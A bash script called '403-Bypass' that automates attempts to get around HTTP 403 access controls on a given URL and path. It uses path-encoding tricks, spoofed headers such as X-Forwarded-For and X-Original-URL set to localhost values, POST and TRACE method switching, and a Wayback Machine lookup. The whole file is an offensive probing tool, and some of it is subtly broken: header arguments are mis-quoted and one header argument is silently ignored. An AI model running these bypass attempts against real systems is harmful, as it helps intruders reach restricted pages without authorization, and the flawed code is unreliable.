#!/bin/bash

SCRIPT_NAME="403-Bypass"
AUTHOR="Osman Tunahan ARIKAN"
TARGET_URL="$1"
TARGET_PATH="$2"

function color_code() {
    local status=$1
    if [[ $status -eq 200 ]]; then
        echo -e "\033[32m$status\033[0m"
    elif [[ $status -eq 403 ]]; then
        echo -e "\033[31m$status\033[0m"
    else
        echo -e "\033[33m$status\033[0m"
    fi
}

function make_request() {
    local url=$1
    local extra_headers=$2
    local method=$3

    response=$(curl -k -s -o /dev/null -iL -w "%{http_code},%{size_download}" $extra_headers -X "${method:-GET}" "$url")
    http_code=$(color_code $(echo "$response" | cut -d, -f1))
    size=$(echo "$response" | cut -d, -f2)
    
    echo -e "[$(date +'%Y-%m-%d %H:%M:%S')] -> ${url} ${extra_headers}\n  Status: ${http_code}, Size: ${size} bytes"
}

function bypass_methods() {
    make_request "${TARGET_URL}/${TARGET_PATH}"
    make_request "${TARGET_URL}/%2e/${TARGET_PATH}"
    make_request "${TARGET_URL}/${TARGET_PATH}/."
    make_request "${TARGET_URL}//${TARGET_PATH}//"
    make_request "${TARGET_URL}/./${TARGET_PATH}/./"
    make_request "${TARGET_URL}/${TARGET_PATH}%20"
    make_request "${TARGET_URL}/${TARGET_PATH}%09"
    make_request "${TARGET_URL}/${TARGET_PATH}?"
    make_request "${TARGET_URL}/${TARGET_PATH}.html"
    make_request "${TARGET_URL}/${TARGET_PATH}/?anything"
    make_request "${TARGET_URL}/${TARGET_PATH}#"
    make_request "${TARGET_URL}/${TARGET_PATH}/*"
    make_request "${TARGET_URL}/${TARGET_PATH}.php"
    make_request "${TARGET_URL}/${TARGET_PATH}.json"
    make_request "${TARGET_URL}/${TARGET_PATH};/"
    make_request "${TARGET_URL}/${TARGET_PATH}..;/"
}

function header_bypass_methods() {
    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Original-URL: ${TARGET_PATH}'"
    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Custom-IP-Authorization: 127.0.0.1'"
    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Forwarded-For: 127.0.0.1'"
    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Forwarded-Host: 127.0.0.1'"
    make_request "${TARGET_URL}/${TARGET_PATH}" "-H 'X-Host: 127.0.0.1'"
    make_request "${TARGET_URL}" "-H 'X-rewrite-url: ${TARGET_PATH}'"
}

function method_bypass() {
    make_request "${TARGET_URL}/${TARGET_PATH}" "" "POST" "-H 'Content-Length: 0'"
    make_request "${TARGET_URL}/${TARGET_PATH}" "" "TRACE"
}

function wayback_lookup() {
    echo "Checking Wayback Machine for archived versions..."
    curl -s "https://archive.org/wayback/available?url=${TARGET_URL}/${TARGET_PATH}" | jq -r '.archived_snapshots.closest | {available, url}'
}

function main() {
    figlet "${SCRIPT_NAME}"
    echo "${AUTHOR}"
    echo "Usage: ./403-bypass.sh [URL] [path]"
    
    echo -e "\nBypass Methods:"
    bypass_methods
    echo -e "\nHeader Bypass Methods:"
    header_bypass_methods
    echo -e "\nOther Methods:"
    method_bypass
    echo -e "\nWayback Machine:"
    wayback_lookup
}

if [[ $# -ne 2 ]]; then
    echo "Invalid arguments. Usage: ./403-bypass.sh [URL] [path]"
    exit 1
else
    main
fi